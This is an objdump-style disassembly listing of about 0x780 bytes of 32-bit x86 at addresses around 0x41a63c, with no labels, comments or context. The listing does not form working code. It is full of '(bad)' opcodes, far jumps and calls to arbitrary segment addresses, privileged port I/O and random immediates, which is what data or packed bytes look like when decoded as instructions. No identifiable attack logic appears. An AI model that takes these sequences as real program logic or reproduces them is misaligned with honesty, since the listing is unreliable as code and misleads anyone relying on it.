  41a63c:	fstp   st(1)
  41a63f:	push   esi
  41a640:	ins    WORD PTR es:[edi],dx
  41a642:	push   esp
  41a643:	pop    esp
  41a644:	pop    ds
  41a645:	jmp    0xa8e4:0xd5663cd1
  41a64c:	lock dec eax
  41a64e:	jl     0x41a613
  41a650:	mul    DWORD PTR [ebp-0x19]
  41a653:	call   0x6748:0x219a30b9
  41a65a:	jmp    0x167b:0x2c673e8a
  41a661:	(bad)  
  41a662:	sti    
  41a663:	shr    BYTE PTR [ebp+0x2e25c896],cl
  41a669:	push   edx
  41a66a:	dec    eax
  41a66b:	stc    
  41a66c:	or     BYTE PTR [ebx],bl
  41a66e:	stc    
  41a66f:	das    
  41a670:	pop    es
  41a671:	add    al,0xfc
  41a673:	and    al,0x73
  41a675:	cli    
  41a676:	js     0x41a5fd
  41a678:	jae    0x41a61e
  41a67a:	push   esi
  41a67b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a67c:	fdiv   QWORD PTR [edx+eax*1]
  41a67f:	(bad)  
  41a680:	int3   
  41a681:	inc    ebp
  41a682:	push   0x9f4cc50b
  41a687:	xor    ebx,DWORD PTR [ebx-0x9fbfd60]
  41a68d:	(bad)  
  41a68e:	xlat   BYTE PTR ds:[ebx]
  41a68f:	stos   DWORD PTR es:[edi],eax
  41a690:	mov    WORD PTR [edi+0x2ec8816],ss
  41a696:	lahf   
  41a697:	iret   
  41a698:	fwait
  41a699:	pop    edx
  41a69a:	lods   eax,DWORD PTR ds:[esi]
  41a69b:	dec    ebp
  41a69c:	retf   0xb2f8
  41a69f:	jle    0x41a707
  41a6a1:	ret    0xa021
  41a6a4:	sbb    bl,BYTE PTR [edi]
  41a6a6:	adc    BYTE PTR [edx],0x34
  41a6a9:	xlat   BYTE PTR ds:[ebx]
  41a6aa:	mov    bh,0xd1
  41a6ac:	int    0x20
  41a6ae:	mov    eax,0xbb1a4c7d
  41a6b3:	fnstsw WORD PTR [ecx]
  41a6b5:	lock or al,0x2
  41a6b8:	in     al,dx
  41a6b9:	mov    cl,0x4a
  41a6bb:	mov    BYTE PTR [edi+0x2],bl
  41a6be:	add    BYTE PTR [ebp-0x71518e94],dh
  41a6c4:	jg     0x41a6ed
  41a6c6:	repz add dh,BYTE PTR [esi]
  41a6c9:	jmp    0x41a735
  41a6cb:	dec    ebp
  41a6cc:	and    BYTE PTR [edi],dl
  41a6ce:	(bad)  
  41a6cf:	mov    eax,0x487c7584
  41a6d4:	jno    0x41a6bd
  41a6d6:	jno    0x41a713
  41a6d8:	arpl   WORD PTR [esi-0x6a510b6a],cx
  41a6de:	mov    BYTE PTR [ebp+0x5afc5b34],al
  41a6e4:	call   0xebae82ca
  41a6e9:	ins    DWORD PTR es:[edi],dx
  41a6ea:	mov    eax,0x209d751
  41a6ef:	mov    dh,0xd8
  41a6f1:	pop    ecx
  41a6f2:	shl    BYTE PTR [ecx-0x18dbc1bc],1
  41a6f8:	push   ecx
  41a6f9:	mov    esi,0xbd6cf371
  41a6fe:	adc    DWORD PTR [ebx],esp
  41a700:	dec    edi
  41a701:	out    dx,eax
  41a702:	cs icebp 
  41a704:	push   0x2e24cecf
  41a709:	jmp    0x41a75b
  41a70b:	or     al,0x96
  41a70d:	scas   eax,DWORD PTR es:[edi]
  41a70e:	adc    esp,ebx
  41a710:	imul   eax
  41a712:	dec    ebx
  41a713:	daa    
  41a714:	cs mov ss,esp
  41a717:	es push esp
  41a719:	call   0xb123:0x9cbe79cf
  41a720:	sti    
  41a721:	or     al,0xb3
  41a723:	cmp    BYTE PTR [edi-0x7cf0642],al
  41a729:	xchg   edi,eax
  41a72a:	fadd   QWORD PTR [edx]
  41a72c:	outs   dx,BYTE PTR ds:[esi]
  41a72d:	push   edx
  41a72e:	push   edx
  41a72f:	sahf   
  41a730:	shl    DWORD PTR [edi],0x54
  41a733:	std    
  41a734:	cmp    edx,DWORD PTR ds:0x432b60e8
  41a73a:	inc    edx
  41a73b:	mov    ecx,0x324142c8
  41a740:	dec    esi
  41a741:	nop
  41a742:	pop    esp
  41a743:	mov    ah,dl
  41a745:	or     ebx,edi
  41a747:	mov    edi,0xc8dacf9
  41a74c:	imul   ecx,DWORD PTR [edi+ecx*8+0x502d9eec],0xfffffff8
  41a754:	fwait
  41a755:	and    eax,0x3f9e96a2
  41a75a:	fstp   QWORD PTR [edx+0x2e583367]
  41a760:	dec    eax
  41a761:	mov    esp,0xb297f480
  41a766:	xor    BYTE PTR [esi-0x7568864c],dh
  41a76c:	pop    esi
  41a76d:	out    0x91,al
  41a76f:	bswap  esi
  41a771:	inc    ecx
  41a772:	or     al,0x19
  41a774:	mov    ebp,0x11c1bad
  41a779:	cli    
  41a77a:	enter  0x2dee,0x9b
  41a77e:	int3   
  41a77f:	scas   al,BYTE PTR es:[edi]
  41a780:	stos   DWORD PTR es:[edi],eax
  41a781:	por    mm2,QWORD PTR cs:[edi+0x3414bdb7]
  41a789:	(bad)  
  41a78a:	dec    ecx
  41a78b:	shl    DWORD PTR [edi-0x1f252606],1
  41a791:	dec    esi
  41a792:	or     al,0x5b
  41a794:	dec    esp
  41a795:	mov    eax,ds:0xe5b09eea
  41a79a:	out    0x1d,eax
  41a79c:	jae    0x41a7c5
  41a79e:	daa    
  41a79f:	jmp    0x1814ef1d
  41a7a4:	lds    ebp,FWORD PTR [ebx]
  41a7a6:	mov    WORD PTR [eax+edi*1-0x2b46bc95],?
  41a7ad:	sub    BYTE PTR [eax+0x50b772af],cl
  41a7b3:	inc    edx
  41a7b4:	rcl    DWORD PTR [eax+eiz*2-0x702dbf64],cl
  41a7bb:	imul   edx,esp,0x2b77a99c
  41a7c1:	ret    
  41a7c2:	neg    DWORD PTR [ebx+0x5c9af3bb]
  41a7c8:	mov    gs,WORD PTR [edi]
  41a7ca:	js     0x41a75d
  41a7cc:	imul   esp,DWORD PTR ds:0xb9a47387,0x58
  41a7d3:	leave  
  41a7d4:	ins    DWORD PTR es:[edi],dx
  41a7d5:	mov    cl,0x3b
  41a7d7:	xchg   edi,eax
  41a7d8:	call   0xae02:0xec53bd65
  41a7df:	std    
  41a7e0:	jmp    0x99d52b17
  41a7e5:	cld    
  41a7e6:	(bad)  
  41a7e8:	adc    BYTE PTR [edi],ch
  41a7ea:	in     al,0x8
  41a7ec:	and    DWORD PTR [ebx],0x686ea08f
  41a7f2:	sbb    BYTE PTR [eax-0x6ede3aa6],bh
  41a7f8:	ins    BYTE PTR es:[edi],dx
  41a7f9:	add    dl,BYTE PTR [ebx-0x5de500c6]
  41a7ff:	imul   ecx,eax,0x39
  41a802:	sbb    ecx,DWORD PTR [edx+0x2d]
  41a805:	lods   al,BYTE PTR ds:[esi]
  41a806:	cli    
  41a807:	enter  0xfaf7,0xd9
  41a80b:	inc    edi
  41a80c:	push   es
  41a80d:	cwde   
  41a80e:	and    ecx,edi
  41a810:	xor    eax,0x97b67cbb
  41a815:	in     al,dx
  41a816:	sbb    eax,0xb38b8e0e
  41a81b:	hlt    
  41a81c:	cdq    
  41a81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a81e:	add    BYTE PTR [ebp+0x35],0x81
  41a822:	cmp    BYTE PTR [eax],ah
  41a824:	xchg   ebp,eax
  41a825:	cmp    cl,BYTE PTR [ebp+ebp*1+0x4f0c9a9]
  41a82c:	in     eax,dx
  41a82d:	mov    eax,0x7fec84d2
  41a832:	cli    
  41a833:	lods   al,BYTE PTR ds:[esi]
  41a834:	mov    dl,0x7d
  41a836:	sub    bh,BYTE PTR [eax]
  41a838:	and    DWORD PTR [edx],ebx
  41a83a:	jo     0x41a8ba
  41a83c:	mov    ecx,gs
  41a83e:	inc    eax
  41a83f:	retf   0x618
  41a842:	stos   BYTE PTR es:[edi],al
  41a843:	inc    esi
  41a844:	jp     0x41a8af
  41a846:	and    DWORD PTR [ecx+eax*1],esi
  41a849:	adc    al,BYTE PTR [edi+ecx*2]
  41a84c:	jp     0x41a86e
  41a84e:	sub    edi,edi
  41a850:	add    BYTE PTR [esi],dl
  41a852:	sub    al,0xfa
  41a854:	call   0x59533a76
  41a859:	mov    dl,0x7e
  41a85b:	adc    eax,0x2a3a2c7d
  41a860:	sbb    ch,BYTE PTR gs:[ebx+0x56023149]
  41a867:	push   ebp
  41a868:	xor    al,0x26
  41a86a:	stc    
  41a86b:	clc    
  41a86c:	shr    al,0x9c
  41a86f:	mov    ds:0xd2733e75,eax
  41a874:	(bad)  
  41a875:	mov    ah,0xa6
  41a877:	xchg   edi,eax
  41a878:	stos   DWORD PTR es:[edi],eax
  41a879:	jb     0x41a881
  41a87b:	iret   
  41a87c:	enter  0xa828,0x63
  41a880:	repnz ins DWORD PTR es:[edi],dx
  41a882:	mov    ch,0x8a
  41a884:	add    BYTE PTR [edx-0x27],ah
  41a887:	push   edx
  41a888:	ss scas al,BYTE PTR es:[edi]
  41a88a:	jg     0x41a80c
  41a88c:	sbb    BYTE PTR ds:0xff3c8e14,bl
  41a892:	mov    dl,0x1b
  41a894:	jb     0x41a8f5
  41a896:	fld    DWORD PTR [ebx]
  41a898:	sbb    al,0x2e
  41a89a:	cli    
  41a89b:	rol    DWORD PTR [eax+0x2888e4a4],0xa5
  41a8a2:	out    0xfb,al
  41a8a4:	cdq    
  41a8a5:	cmp    ch,cl
  41a8a7:	mov    esp,DWORD PTR [eax-0x746dafec]
  41a8ad:	xchg   ecx,eax
  41a8ae:	push   edx
  41a8af:	outs   dx,DWORD PTR ds:[esi]
  41a8b0:	cs mov bh,0x22
  41a8b3:	pop    ecx
  41a8b4:	inc    edi
  41a8b5:	loope  0x41a8f7
  41a8b7:	std    
  41a8b8:	loope  0x41a8e8
  41a8ba:	mov    al,ds:0xb4da9245
  41a8bf:	pop    esi
  41a8c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c1:	in     eax,dx
  41a8c2:	shl    BYTE PTR [eax+0x5a101af3],cl
  41a8c8:	cmp    dl,BYTE PTR ds:0xd1efdb77
  41a8ce:	and    DWORD PTR [edx+0x62],edi
  41a8d1:	cmp    dl,BYTE PTR [ecx+esi*1+0x77c27801]
  41a8d8:	jae    0x41a893
  41a8da:	sbb    dl,bl
  41a8dc:	out    dx,al
  41a8dd:	(bad)  
  41a8de:	dec    eax
  41a8df:	test   BYTE PTR [edi-0x27],dl
  41a8e2:	test   BYTE PTR [esi],dh
  41a8e4:	call   FWORD PTR [edi+0x633a3daf]
  41a8ea:	adc    DWORD PTR [ecx],esp
  41a8ec:	pop    ebp
  41a8ed:	pop    ebp
  41a8ee:	inc    edx
  41a8ef:	loop   0x41a91a
  41a8f1:	dec    ebp
  41a8f2:	adc    eax,DWORD PTR [ebp+ebp*8-0x52]
  41a8f6:	fwait
  41a8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8f8:	daa    
  41a8f9:	add    al,0xcc
  41a8fb:	lea    eax,[edx]
  41a8fd:	xor    ch,ch
  41a8ff:	sbb    al,0x1f
  41a901:	fsub   DWORD PTR [ebx+0x106830ff]
  41a907:	cmp    eax,eax
  41a909:	xor    al,0x90
  41a90b:	into   
  41a90c:	cdq    
  41a90d:	push   esi
  41a90e:	xchg   ecx,eax
  41a90f:	shl    BYTE PTR [eax],1
  41a911:	rcl    BYTE PTR [esi+0xe710adb],1
  41a917:	jns    0x41a965
  41a919:	mov    ebx,0xe0da0203
  41a91e:	sti    
  41a91f:	fist   WORD PTR [esi-0x32]
  41a922:	jnp    0x41a8fa
  41a924:	adc    esi,DWORD PTR [ecx+0x797ef4cf]
  41a92a:	xchg   edi,eax
  41a92b:	and    ebx,DWORD PTR [esi+0x7cde6016]
  41a931:	jl     0x41a8c5
  41a933:	outs   dx,DWORD PTR ds:[esi]
  41a934:	mov    eax,ds:0xb86366b0
  41a939:	data16 fdiv DWORD PTR [ebx+0x1a6ace82]
  41a940:	xchg   edi,eax
  41a941:	xor    esp,DWORD PTR [ecx+0x2]
  41a944:	jne    0x41a907
  41a946:	inc    ebx
  41a947:	test   bh,dl
  41a949:	repnz mov cl,0xcf
  41a94c:	cmp    ah,BYTE PTR ds:0x738ed103
  41a952:	cli    
  41a953:	int    0xc9
  41a955:	in     al,0xbd
  41a957:	jmp    0x743bd790
  41a95c:	push   ebp
  41a95d:	sbb    dh,dh
  41a95f:	aam    0xc9
  41a961:	jge    0x41a983
  41a963:	sub    DWORD PTR [ecx],edx
  41a965:	xchg   ecx,eax
  41a966:	add    eax,0x2d05f1e8
  41a96b:	xchg   esp,eax
  41a96c:	xor    bl,BYTE PTR [eax]
  41a96e:	or     BYTE PTR [edx-0x4346249a],al
  41a974:	setae  BYTE PTR [eax+0x2]
  41a978:	shl    DWORD PTR [ebp-0x399cb8ff],cl
  41a97e:	lahf   
  41a97f:	shl    BYTE PTR [ebx+0x4f],1
  41a982:	test   al,0x45
  41a984:	in     al,0x95
  41a986:	jl     0x41a9d0
  41a988:	(bad)
  41a98b:	jl     0x41a938
  41a98d:	cdq    
  41a98e:	in     al,dx
  41a98f:	dec    ebx
  41a990:	add    ebp,DWORD PTR [eax-0x2b78540a]
  41a996:	sar    ebx,1
  41a998:	or     BYTE PTR [eax],0x4d
  41a99b:	or     edi,edi
  41a99d:	and    BYTE PTR [ebx-0x60],dh
  41a9a0:	cmp    cl,dh
  41a9a2:	add    BYTE PTR [eax],0x1c
  41a9a5:	jmp    0xba62834c
  41a9aa:	fidiv  DWORD PTR [ecx-0x48]
  41a9ad:	pop    esi
  41a9ae:	dec    edi
  41a9af:	or     BYTE PTR [eax+0x655739e9],bl
  41a9b5:	cwde   
  41a9b6:	xchg   edx,eax
  41a9b7:	sar    DWORD PTR [edx+0x1d],0x1a
  41a9bb:	inc    eax
  41a9bc:	fdivr  QWORD PTR [eax-0x734a9e3]
  41a9c2:	call   0xb7d6:0xdf33c250
  41a9c9:	xchg   edx,eax
  41a9ca:	inc    edi
  41a9cb:	shl    DWORD PTR [ecx-0x1e],0x9d
  41a9cf:	int    0xfe
  41a9d1:	jg     0x41a9a5
  41a9d3:	outs   dx,BYTE PTR ds:[esi]
  41a9d4:	pop    ecx
  41a9d5:	cmp    BYTE PTR [ecx],dl
	...
  41a9df:	add    BYTE PTR [eax],al
  41a9e1:	inc    ebx
  41a9e2:	clc    
  41a9e3:	gs sbb edi,edi
  41a9e6:	popf   
  41a9e7:	jg     0x41a9e3
  41a9e9:	mov    al,0x88
  41a9eb:	dec    ebp
  41a9ec:	sahf   
  41a9ed:	or     eax,0x6fdf4efe
  41a9f2:	daa    
  41a9f3:	add    DWORD PTR [eax],eax
  41a9f5:	scas   al,BYTE PTR es:[edi]
  41a9f6:	add    eax,DWORD PTR [eax]
  41a9f8:	add    BYTE PTR [ebx-0x110eabbd],ah
  41a9fe:	jp     0x41aa4b
  41aa00:	lock add ebx,DWORD PTR [edi+ecx*8+0x39]
  41aa05:	aam    0x1a
  41aa07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa08:	das    
  41aa09:	ret    
  41aa0a:	sub    BYTE PTR [ebp-0x76],dl
  41aa0d:	mov    edx,DWORD PTR [edi+0x5c]
  41aa10:	pop    esp
  41aa11:	enter  0x47ab,0x2f
  41aa15:	or     eax,0xf517cfda
  41aa1a:	dec    ecx
  41aa1b:	fmul   QWORD PTR [ecx]
  41aa1d:	(bad)  
  41aa1e:	mov    edx,0xae088104
  41aa23:	iret   
  41aa24:	push   esi
  41aa25:	push   edx
  41aa26:	pushf  
  41aa27:	push   cs
  41aa28:	add    al,0xa5
  41aa2a:	inc    eax
  41aa2b:	rcl    DWORD PTR [ecx+edi*2],1
  41aa2e:	adc    eax,0x4ed0de64
  41aa33:	or     edi,DWORD PTR [edx+edx*2+0x4863e32]
  41aa3a:	(bad)  
  41aa3c:	push   ebx
  41aa3d:	sub    eax,0x880f7456
  41aa42:	cmp    bh,BYTE PTR [edx+0x73110348]
  41aa48:	inc    ecx
  41aa49:	mov    edx,0xbc1f1d81
  41aa4e:	xchg   edi,eax
  41aa4f:	(bad)  
  41aa50:	in     eax,dx
  41aa51:	ret    
  41aa52:	lods   al,BYTE PTR ds:[esi]
  41aa53:	push   esi
  41aa54:	fadd   st,st(3)
  41aa56:	mov    bh,0x66
  41aa58:	jle    0x41a9fb
  41aa5a:	jnp    0x41aa54
  41aa5c:	push   eax
  41aa5d:	xor    ebp,ebp
  41aa5f:	xchg   ecx,eax
  41aa60:	inc    ebx
  41aa61:	fwait
  41aa62:	push   ebx
  41aa63:	jmp    0xc856:0x6da5b3e4
  41aa6a:	js     0x41aa2d
  41aa6c:	aam    0x60
  41aa6e:	cmp    ebp,0x6b5bb8c6
  41aa74:	or     BYTE PTR [edx-0xe],bl
  41aa77:	icebp  
  41aa78:	pop    ecx
  41aa79:	cwde   
  41aa7a:	lea    ebp,[ebp+0x25629d71]
  41aa80:	or     DWORD PTR [edx*2-0x1366d030],0x4d
  41aa88:	pop    ebx
  41aa89:	fs pop ebx
  41aa8b:	sbb    BYTE PTR [ecx],bl
  41aa8d:	in     eax,dx
  41aa8e:	aad    0x10
  41aa90:	pop    eax
  41aa91:	daa    
  41aa92:	cs cwde 
  41aa94:	dec    esp
  41aa95:	push   0xf26707bc
  41aa9a:	jns    0x41aa4a
  41aa9c:	shl    BYTE PTR [ecx+0x54f5ce2],cl
  41aaa2:	scas   al,BYTE PTR es:[edi]
  41aaa3:	and    eax,0x13f7bd89
  41aaa8:	and    al,0xd0
  41aaaa:	mov    ecx,DWORD PTR [eax]
  41aaac:	mov    ebx,0x1b584cb
  41aab1:	mov    DWORD PTR [ecx],esi
  41aab3:	push   edi
  41aab4:	(bad)  gs:[edx]
  41aab7:	sti    
  41aab8:	mov    ebp,0xd7c6fd79
  41aabd:	jg     0x41aabc
  41aabf:	cli    
  41aac0:	stos   BYTE PTR es:[edi],al
  41aac1:	psadbw mm5,QWORD PTR [ecx+0x5b]
  41aac5:	push   cs
  41aac6:	and    DWORD PTR [esi],ebx
  41aac8:	div    DWORD PTR [esi+0x5b]
  41aacb:	wbinvd 
  41aacd:	add    al,al
  41aacf:	sub    ch,BYTE PTR [ecx+0x63]
  41aad2:	div    DWORD PTR [eax+0x69eb0008]
  41aad8:	adc    DWORD PTR [esp+ebx*4],esp
  41aadb:	mov    bh,0xc
  41aadd:	pop    ebx
  41aade:	mov    edi,0xa5bee836
  41aae3:	aas    
  41aae4:	push   es
  41aae5:	call   0x75757a5a
  41aaea:	add    dl,bl
  41aaec:	int    0x30
  41aaee:	dec    ecx
  41aaef:	in     eax,dx
  41aaf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaf1:	cmp    ah,BYTE PTR [eax+edi*2+0x6f]
  41aaf5:	pop    eax
  41aaf6:	inc    ebx
  41aaf7:	push   ds
  41aaf8:	push   0x25
  41aafa:	jmp    0x23a2:0xc43c4c5b
  41ab01:	and    eax,0x6bc390a5
  41ab06:	dec    esp
  41ab07:	add    al,0xe4
  41ab09:	mov    ds:0xc3d25855,al
  41ab0e:	ret    
  41ab0f:	cmp    eax,0x5e0b7a8e
  41ab14:	(bad)  
  41ab15:	fwait
  41ab16:	and    BYTE PTR [ebx-0x15d332ac],ah
  41ab1c:	pop    ecx
  41ab1d:	stos   BYTE PTR es:[edi],al
  41ab1e:	adc    al,0xf2
  41ab20:	mov    dl,0xb3
  41ab22:	pop    eax
  41ab23:	ins    DWORD PTR es:[edi],dx
  41ab24:	mov    al,ds:0x23ac648a
  41ab29:	rcl    DWORD PTR [edx],0x9e
  41ab2c:	xchg   esi,eax
  41ab2d:	add    eax,0x49c635da
  41ab32:	adc    ch,BYTE PTR [edi-0x674dc51]
  41ab38:	pop    esp
  41ab39:	jmp    0x41aacb
  41ab3b:	cmc    
  41ab3c:	inc    ebx
  41ab3d:	scas   al,BYTE PTR es:[edi]
  41ab3e:	and    dl,BYTE PTR [edi-0x3]
  41ab41:	push   ss
  41ab42:	mov    esi,0x6d54a041
  41ab47:	out    0x17,eax
  41ab49:	(bad)  
  41ab4b:	mov    ?,WORD PTR [esi+ecx*2+0xfaee9fd]
  41ab52:	dec    ecx
  41ab53:	mov    ch,0xa2
  41ab55:	mov    esp,0xc6710328
  41ab5a:	clc    
  41ab5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab5c:	mov    al,0x8e
  41ab5e:	mov    dh,0x1b
  41ab60:	scas   al,BYTE PTR es:[edi]
  41ab61:	add    dl,BYTE PTR [ecx+0x22]
  41ab64:	in     al,dx
  41ab65:	into   
  41ab66:	jle    0x41ab3d
  41ab68:	call   0xc25a:0xa10bd555
  41ab6f:	pop    eax
  41ab70:	outs   dx,BYTE PTR ds:[esi]
  41ab71:	mov    ss,WORD PTR [ecx+ebp*1-0x24]
  41ab75:	ror    DWORD PTR [esi-0x67],0x46
  41ab79:	push   ss
  41ab7a:	adc    dl,dh
  41ab7c:	sub    ah,dl
  41ab7e:	arpl   WORD PTR [esi-0x4],dx
  41ab81:	mov    esp,DWORD PTR ds:0xe2ab4a6a
  41ab87:	pop    ecx
  41ab88:	es cld 
  41ab8a:	pop    edx
  41ab8b:	sub    BYTE PTR [eax],ch
  41ab8d:	jecxz  0x41ab14
  41ab8f:	sub    eax,0x2914318e
  41ab94:	mov    ch,0x51
  41ab96:	mov    eax,0x1099d891
  41ab9b:	icebp  
  41ab9c:	pop    ss
  41ab9d:	(bad)  
  41ab9e:	aam    0xe9
  41aba0:	imul   ebp,DWORD PTR [ebp+0x55],0xffffffb8
  41aba4:	xchg   DWORD PTR [esi],ecx
  41aba6:	or     al,BYTE PTR [edx]
  41aba8:	jmp    0x41ab39
  41abaa:	or     DWORD PTR [eax],ebx
  41abac:	gs jb  0x41abde
  41abaf:	push   edi
  41abb0:	js     0x41ab8d
  41abb2:	scas   al,BYTE PTR es:[edi]
  41abb3:	aas    
  41abb4:	nop
  41abb5:	fs push esp
  41abb7:	icebp  
  41abb8:	xor    eax,DWORD PTR [esi+0x5d16c928]
  41abbe:	jecxz  0x41ab78
  41abc0:	(bad)  
  41abc1:	dec    esi
  41abc2:	test   al,0x8e
  41abc4:	push   ebx
  41abc5:	arpl   WORD PTR [esi],bp
  41abc7:	fldcw  WORD PTR [ecx+esi*4-0x74293679]
  41abce:	pop    ebp
  41abcf:	xlat   BYTE PTR ds:[ebx]
  41abd0:	(bad)  
  41abd1:	(bad)  
  41abd3:	mov    dh,0x3c
  41abd5:	push   ebp
  41abd6:	hlt    
  41abd7:	pop    eax
  41abd8:	jmp    0x777f:0x2453ba16
  41abdf:	inc    esi
  41abe0:	inc    ecx
  41abe1:	je     0x41ac29
  41abe3:	mov    edx,0x940d12fe
  41abe8:	outs   dx,DWORD PTR ds:[esi]
  41abe9:	and    ch,BYTE PTR [ebp*4-0x212be4cc]
  41abf0:	cmp    DWORD PTR [eax+esi*2+0x31],edi
  41abf4:	ja     0x41ac61
  41abf6:	pop    es
  41abf7:	add    al,0xdf
  41abf9:	mov    dl,0xbe
  41abfb:	mov    edx,0x229e023
  41ac00:	jno    0x41aba3
  41ac02:	jnp    0x41ac59
  41ac04:	mov    ds:0x6ebc2831,eax
  41ac09:	mov    bh,0x7e
  41ac0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac0c:	jle    0x41abd5
  41ac0e:	ror    DWORD PTR [esp+edi*1],1
  41ac11:	mov    ebp,0xf114341e
  41ac16:	push   ss
  41ac17:	test   ch,0x8e
  41ac1a:	outs   dx,BYTE PTR ds:[esi]
  41ac1b:	xor    al,BYTE PTR [edi-0x28]
  41ac1e:	call   0x11ad:0xb63bf630
  41ac25:	add    al,0x28
  41ac27:	mov    eax,0xd00d73db
  41ac2c:	lds    edx,FWORD PTR ss:0xc635ee0e
  41ac33:	jnp    0x41ac73
  41ac35:	pop    esp
  41ac36:	vpshaw ymm5,[edx],xmm4
  41ac3b:	(bad)  
  41ac3c:	(bad)  
  41ac3e:	and    bl,ch
  41ac40:	pop    ss
  41ac41:	and    eax,DWORD PTR [edx+0x26]
  41ac44:	jecxz  0x41ac86
  41ac46:	sub    edi,DWORD PTR [edx+0x3b]
  41ac49:	inc    edi
  41ac4a:	mov    ah,0x5c
  41ac4c:	xchg   ebp,eax
  41ac4d:	sbb    al,0x3
  41ac4f:	(bad)  
  41ac50:	imul   esi,DWORD PTR [esi+0x27068ab3],0xffffff95
  41ac57:	fnstsw WORD PTR ds:0x1d5b54c1
  41ac5d:	push   ebp
  41ac5e:	fimul  WORD PTR [edx-0x741d1f5a]
  41ac64:	(bad)  
  41ac65:	pop    ecx
  41ac66:	sub    BYTE PTR [edi+0x7b075069],0xc9
  41ac6d:	or     BYTE PTR [esi],bh
  41ac6f:	sti    
  41ac70:	add    DWORD PTR [ebx+0x330c2664],eax
  41ac76:	inc    edi
  41ac77:	jge    0x41acbb
  41ac79:	data16 es xchg bl,ch
  41ac7d:	lods   eax,DWORD PTR ds:[esi]
  41ac7e:	jg     0x41acf9
  41ac80:	aam    0x28
  41ac82:	push   ebp
  41ac83:	icebp  
  41ac84:	das    
  41ac85:	jmp    0x57e8:0x4a31df04
  41ac8c:	mov    WORD PTR [edi],?
  41ac8e:	stc    
  41ac8f:	jge    0x41ac45
  41ac91:	mov    ebx,0x95246ea0
  41ac96:	imul   esp,DWORD PTR [edi],0xb9a4cd7c
  41ac9c:	pop    ecx
  41ac9d:	jmp    0x41acd3
  41ac9f:	daa    
  41aca0:	out    0xff,eax
  41aca2:	jle    0x41ac6c
  41aca4:	pop    eax
  41aca5:	sbb    edi,DWORD PTR [edi-0x3900d96b]
  41acab:	xchg   ebp,eax
  41acac:	cmp    al,0x4a
  41acae:	cmp    DWORD PTR [eax-0x32],0x29
  41acb2:	in     eax,0x6b
  41acb4:	jns    0x41ad19
  41acb6:	dec    esi
  41acb7:	mov    ah,0xd7
  41acb9:	cmp    al,0xa9
  41acbb:	push   esi
  41acbc:	and    eax,esp
  41acbe:	jg     0x41ac73
  41acc0:	jp     0x41acfc
  41acc2:	jg     0x41acbf
  41acc4:	xchg   edi,eax
  41acc5:	fcom   DWORD PTR [eax]
  41acc7:	add    esp,0xad9c4887
  41accd:	sub    al,0x71
  41accf:	bnd jl 0x41ad49
  41acd2:	lods   al,BYTE PTR ds:[esi]
  41acd3:	das    
  41acd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acd5:	mov    al,0xf8
  41acd7:	jne    0x41acb9
  41acd9:	xor    ebx,DWORD PTR [edx+0x38]
  41acdc:	sbb    ch,BYTE PTR ds:0x5f138ad3
  41ace2:	sbb    eax,0xcded5594
  41ace7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace8:	dec    eax
  41ace9:	adc    dh,BYTE PTR [ebx]
  41aceb:	stos   BYTE PTR es:[edi],al
  41acec:	shl    BYTE PTR [eax],1
  41acee:	call   DWORD PTR [ebx-0x3aa6175d]
  41acf4:	mov    al,bl
  41acf6:	xor    DWORD PTR [esi-0x5818f2ec],esp
  41acfc:	loop   0x41ad13
  41acfe:	inc    ebx
  41acff:	xchg   edx,eax
  41ad00:	mov    ebp,0x5b7f7c21
  41ad05:	xor    BYTE PTR [ebp-0x2d],dl
  41ad08:	mov    ds:0x496a6538,al
  41ad0d:	sbb    edi,DWORD PTR [eax]
  41ad0f:	and    bl,al
  41ad11:	pop    esp
  41ad12:	mov    esi,0x3a280ab3
  41ad17:	fist   WORD PTR [eax]
  41ad19:	test   al,0xb6
  41ad1b:	jb     0x41ad14
  41ad1d:	mov    al,ds:0x8ee9f034
  41ad22:	mov    esi,0xb372cd26
  41ad27:	lds    ecx,FWORD PTR [edx]
  41ad29:	hlt    
  41ad2a:	and    BYTE PTR [ebp-0x67],0x5c
  41ad2e:	cld    
  41ad2f:	out    0x53,al
  41ad31:	pextrw eax,(bad),0xc5
  41ad33:	push   es
  41ad34:	pop    edi
  41ad35:	addr16 cli 
  41ad37:	stos   BYTE PTR es:[edi],al
  41ad38:	popf   
  41ad39:	adc    eax,0x84ad599c
  41ad3e:	pop    esp
  41ad3f:	pop    esp
  41ad40:	fist   WORD PTR [ecx-0x66f6c0b2]
  41ad46:	jge    0x41ad27
  41ad48:	dec    ebp
  41ad49:	lahf   
  41ad4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad4b:	mov    ecx,0xd6135fee
  41ad50:	push   0x89bba287
  41ad55:	cs daa 
  41ad57:	neg    BYTE PTR [edi-0x78120050]
  41ad5d:	push   ebp
  41ad5e:	xchg   edx,eax
  41ad5f:	test   BYTE PTR [ecx+0x50],ah
  41ad62:	inc    edi
  41ad63:	sub    eax,0xa612f6d9
  41ad68:	icebp  
  41ad69:	jne    0x41ad70
  41ad6b:	jmp    0x41ad09
  41ad6d:	fwait
  41ad6e:	cmp    DWORD PTR [bp+di+0x579],ecx
  41ad73:	retf   
  41ad74:	aam    0x23
  41ad76:	add    al,0xf3
  41ad78:	mov    al,ds:0xd3b9dcf8
  41ad7d:	or     eax,0x50717a82
  41ad82:	dec    ebp
  41ad83:	into   
  41ad84:	icebp  
  41ad85:	ss pop ecx
  41ad87:	retf   0x5fe6
  41ad8a:	test   al,0x3d
  41ad8c:	add    BYTE PTR [ebx-0x4ab8ae79],al
  41ad92:	aaa    
  41ad93:	int    0x28
  41ad95:	add    al,0x41
  41ad97:	aam    0xa0
  41ad99:	dec    edi
  41ad9a:	push   eax
  41ad9b:	int    0x5f
  41ad9d:	mov    edx,DWORD PTR [esp+esi*1+0x2202938d]
  41ada4:	int3   
  41ada5:	fcmovbe st,st(6)
	...
  41adaf:	add    BYTE PTR [eax],al
  41adb1:	pop    es
  41adb2:	sbb    BYTE PTR [esi+0x3fbf9fa7],0xa2
